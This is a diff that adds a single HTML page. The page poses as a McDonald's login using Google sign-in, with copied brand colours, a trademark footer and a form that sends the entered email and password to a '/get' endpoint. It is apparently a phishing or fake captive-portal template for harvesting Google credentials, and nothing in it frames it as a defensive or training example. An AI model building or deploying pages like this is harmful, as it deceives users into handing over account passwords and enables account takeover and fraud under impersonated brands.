@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffc72c; /* McDonald's yellow */
+        }
+        .login-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 400px;
+        }
+        h1, h2 {
+            text-align: center;
+            color: #da291c; /* McDonald's red */
+            margin-bottom: 15px;
+        }
+        .language-select {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .language-select select {
+            padding: 8px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-size: 14px;
+        }
+        .g-input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .gbtn-primary {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #4285F4; /* Google blue */
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .gbtn-primary:hover {
+            background-color: #357ae8;
+        }
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>McDonald's Login</title>
+</head>
+<body>
+    <div class="login-container">
+        <h1>McDonald's®</h1>
+        <h2>Sign in with Google</h2>
+        <div class="language-select">
+            <label for="language">Language:</label>
+            <select id="language" name="language">
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="zh">中文</option>
+            </select>
+        </div>
+        <form action="/get" id="google-sign-in-form">
+            <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
+            <input name="password" type="password" class="g-input" placeholder="Enter your password" required>
+            <button class="gbtn-primary" type="submit">Next</button>
+        </form>
+        <footer>© 2024 McDonald's Corporation. All Rights Reserved.</footer>
+    </div>
+</body>
+</html>
